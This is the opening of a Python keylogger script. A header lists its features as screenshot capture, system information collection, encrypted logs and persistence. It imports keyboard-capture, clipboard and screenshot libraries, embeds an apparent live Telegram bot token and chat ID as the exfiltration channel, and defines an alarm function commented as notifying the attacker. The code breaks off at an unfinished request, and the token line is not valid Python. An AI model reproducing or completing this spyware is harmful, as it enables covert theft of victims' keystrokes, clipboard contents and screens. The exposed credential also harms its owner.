# Enhanced Features
# 1. Screenshot Capture
# 2. System Information Collection
# 3. Log File Encryption
# 4. Persistence

# Import modules
from tempfile import gettempdir
from os import system, name, getenv, path, makedirs
from os.path import isfile, exists, join, expanduser
import threading
from pynput import keyboard
from pyperclip import paste
from datetime import datetime
from time import sleep
import requests
import pyautogui
import platform
from cryptography.fernet import Fernet


TOKEN = 7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA  # Telegram API Token
CHAT_ID = 5818909184  # Telegram Chat ID
INTERVAL = 60
SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots(in seconds)


# Determine the temporary directory based on the OS
temp_dir = gettempdir()
FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
ENCRYPTED_FILENAME = f'{FILENAME}.enc'
SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')


# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)


# To notify attacker if nay issues occur
def alarm(msg) -> None:
    requests.get()
